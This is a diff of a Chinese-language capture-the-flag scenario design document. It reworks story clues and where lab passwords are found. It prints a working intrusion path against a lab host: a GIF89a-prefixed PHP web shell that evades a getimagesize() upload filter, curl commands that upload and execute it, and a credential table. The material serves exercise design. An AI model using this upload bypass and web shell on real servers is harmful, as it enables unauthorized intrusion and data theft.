@@ -83,9 +83,13 @@ curl "http://TARGET:8080/?page=search&q=Farrow"
 
 `$DEPENDENT_INDEX` 這個搜尋後端其實有 **7 筆**公開可查的紀錄，不只 LONGSHORE 給的這 3 筆：另外 4 筆（Priya Anand / Marcus Webb / Dana Song / Theo Alvarez）是刻意放進去的對照組——都是普通、平凡的案件，狀態各自是 Active / Active / Active / Closed-relocated，沒有任何異常欄位。玩家如果好奇多搜尋幾個名字，看到的應該是「大部分紀錄都很正常」，這樣 3 筆有問題的紀錄才顯得異常，而不是讓玩家覺得「這整個系統都是為了劇情設計的」。relay 的 MariaDB 裡還有 2 筆（Nadia Oyelaran / Kenji Park）**只存在 DB 裡，這個公開搜尋介面查不到**，屬於 Act II 才會看到的背景資料，見 3.3 節。
 
+**這一輪新增**：LONGSHORE 給的這 3 筆案件卡（搜尋結果列表跟詳細頁都有）現在多一個 `Internal transfer ref:` 欄位（`SPINDLE-7-0119` / `-0142` / `-0087`），其他 4 筆對照組完全沒有這個欄位。玩家不需要先去翻 Support Tickets 才知道「有異常」——只要查過這 3 個名字，自己就會在案件卡上看到一個其他案件都沒有的欄位，這是玩家自己觀察到的第一手異常，不是被 T. Reyes 的工單告知的。todo.txt（見 2.4 節）現在講的是同一件事的精確版本：「這 3 筆是整個索引裡唯一這欄還有值的已結案案件」，用來確認玩家自己看到的東西不是巧合，而不是第一次告知這個事實。
+
 `?q=` 原本有 reflected XSS，`?page=ping` 原本有 command injection，`?page=notes&file=` 原本有 path traversal——這三個都跟 upload 一樣能拿到 www-data，屬於「多選一但拿到同一個東西」，第十三輪已經全部修掉，只留 upload 這一條唯一的立足點（理由見原則 7）。`ping` 頁面本身還在（`escapeshellarg()` + hostname 格式驗證，正常能 ping），`notes` 也還在（`basename()` 擋掉 `../` traversal），只是不再是漏洞。
 
 ### 2.3 拿初始立足點（www-data）
+
+`?page=upload`（Case File Intake）的頁面文字這一輪改寫過：現在明講「這是案件結案後唯一還能新增/補正文件的管道」，首頁的系統公告也同步改成一樣的說法。玩家會去碰這個功能，理由是「這 3 筆案件的原始 intake 資料是從哪裡進來的、能不能透過同一個管道拿到更多」，而不是單純「CTF 網站有 upload 就該測」——底層漏洞完全沒變，只是玩家抵達這裡的理由不一樣了。
 
 **Unrestricted Upload**：`?page=upload` 用 `getimagesize()` 擋掉非圖片檔（todo.txt 標成 SEC-1188 已修），但沒有 extension allowlist、沒有 rename，`.php` 副檔名照樣被 php-fpm 執行。`getimagesize()` 只檢查檔頭結構，不驗證檔案其餘內容 —— 在合法 GIF 檔頭（`GIF89a` + 最小 logical screen descriptor）後面直接接 PHP payload 即可過檢查，且必須手動拼 multipart body（Burp Repeater 或 curl `--data-binary`），不能只是在檔案選擇對話框挑一個 `.php`：
 ```bash
@@ -93,6 +97,12 @@ printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00<?php syst
 curl -F "file=@shell.php;type=image/gif" "http://TARGET:8080/?page=upload"
 curl "http://TARGET:8080/uploads/shell.php?c=id"
 ```
+
+**這一輪新增，第一次拿到程式碼執行後的即時故事回饋**：`/var/backups/roster/reyes_scratch.txt`——T. Reyes 自己留下、從沒打算被讀到的私人筆記，不在 `notes/` 目錄底下、nginx 沒有服務這個路徑，`?page=notes&file=` 的 `basename()` 限制也構造性地碰不到它（`../` 會被收斂回 `notes/` 目錄內），**只有真的拿到程式碼執行、能讀任意檔案系統路徑之後才碰得到**：
+```bash
+curl "http://TARGET:8080/uploads/shell.php?c=cat+/var/backups/roster/reyes_scratch.txt"
+```
+內容是 2.2 節案件卡上那個新欄位的「人工版驗證」：T. Reyes 自己把整個索引的已結案案件都比對過一輪，確認就是這 3 筆案件、只有這 3 筆帶著 `transfer_ref`，其他已結案案件全部是空的。玩家在拿到第一個 shell 後幾秒鐘內，就能得到一個「只有突破後才確認得到」的故事事實，形成正回饋，而不是純技術上的立足點——但這裡仍然只是「確認異常真的存在、且被人注意到但沒人深究」，不解答異常是什麼，跟 §2.6 的推理節奏一致。
 
 ### 2.4 Support Tickets — 建立懷疑 + 找到合法密碼來源
 ```bash
@@ -108,7 +118,9 @@ curl "http://TARGET:8080/?page=notes&file=credential_rotation_status.txt"
 ```
 `/notes/` 目錄實際列出 **7 個檔案**，多出來的 4 個（`parking_permit_renewal.txt`、`elevator_status.txt`、`supply_closet_note.txt`、`t_reyes_annual_review_2546.txt`）是純填充內容，跟劇情/漏洞無關——刻意讓這個 autoindex 看起來像真的辦公室共用資料夾裡會有的雜物，不是「一列出來就知道哪個檔案是重點」。`t_reyes_annual_review_2546.txt` 是 T. Reyes 本人的年度考核，純粹強化他既有的抱怨語氣（跟 todo.txt 一致），不帶線索，會掛他的頭像。
 
-`credential_rotation_status.txt` 這份文件現在只回報「terminal/webmail 人員帳號」的輪替狀態，不再一次性倒出四組帳密：`devuser` 已在去年稽核後完成 first-login 輪替（死線索）、`deploy` 已隨舊系統一併停用（死線索），只有 `sysadmin` 還卡在 Security 簽核，因此文件裡才會附上它目前仍是 provisioning 預設密碼 `admin123`。這份文件明確寫「機器/服務帳號由 Ops 另外追蹤」——`backup` 帳號完全不在這份清單裡，它的密碼只能靠 3.3 節 relay 的 `service_accounts` 資料表另外找到，兩條發現管道刻意分開，不是同一份文件重複重用。頁面上如果順手看一下 `?page=notes&file=welcome.txt` 旁邊列的其他人員，會看到 T. Reyes 的頭像（`t_reyes.jpg`，真實照片素材）掛在留言旁邊——純粹增加真實感，不帶任何線索。
+`credential_rotation_status.txt` 這份文件現在只回報「terminal/webmail 人員帳號」的輪替狀態，不再一次性倒出四組帳密：`devuser` 已在去年稽核後完成 first-login 輪替（死線索）、`deploy` 已隨舊系統一併停用（死線索），只有 `sysadmin` 還卡在 Security 簽核。這份文件明確寫「機器/服務帳號由 Ops 另外追蹤」——`backup` 帳號完全不在這份清單裡，它的密碼只能靠 3.3 節 relay 的 `service_accounts` 資料表另外找到，兩條發現管道刻意分開，不是同一份文件重複重用。頁面上如果順手看一下 `?page=notes&file=welcome.txt` 旁邊列的其他人員，會看到 T. Reyes 的頭像（`t_reyes.jpg`，真實照片素材）掛在留言旁邊——純粹增加真實感，不帶任何線索。
+
+**這一輪拆開的密碼線索**：`credential_rotation_status.txt` 這一輪不再直接寫出 `sysadmin:admin123` 這組明文帳密，只講「`sysadmin` 從來沒經過 first-login 輪替，還在用 provisioning 範本的預設值（範本目前的預設值可以查新人須知）」；真正的預設值 `admin123` 搬到 `welcome.txt`（2.4 節本來就會讀到）裡，用一句跟任何特定帳號無關的通用政策描述（「每個新開的帳號都還是用同一套 provisioning 範本，直到有人強制輪替」）交代。玩家要自己把「A：範本預設密碼是 admin123」+「B：sysadmin 沒輪替、還在用範本預設值」兩份獨立文件的資訊接起來，才能推出 `sysadmin/admin123`——沒有增加任何猜測/解謎難度（兩份文件都直接讀得到，密碼本身完全沒有變複雜），純粹是把「设计者把鑰匙直接放在一個檔案裡」的感覺，換成「玩家自己做了一步推論」。
 
 ### 2.5 Webmail（8025）— 憑證重用的起點
 ```bash
@@ -411,7 +423,7 @@ cat /root/cairn_disposition_review.txt
 
 | 密碼 | 發現管道 |
 |---|---|
-| `sysadmin/admin123`（webmail + relay SSH + archive SMB） | frontier `/notes/` 目錄列出的 `credential_rotation_status.txt` |
+| `sysadmin/admin123`（webmail + relay SSH + archive SMB） | frontier `/notes/` 目錄列出的兩份文件合起來：`credential_rotation_status.txt`（哪個帳號還沒輪替：`sysadmin`）+ `welcome.txt`（範本預設密碼是什麼：`admin123`） |
 | `root/S3cretDB!2024`（relay MariaDB） | frontier webmail inbox 第二封信；relay `service_accounts` 沒有這筆但 MariaDB 連線本身就是憑證來源 |
 | `duty.admin/MailP@ss2024`（webmail） | frontier webmail `/debug` 環境變數洩漏 |
 | CAIRN Fileshare 帳密 | relay MariaDB `service_accounts` 表（密碼重用印證） |
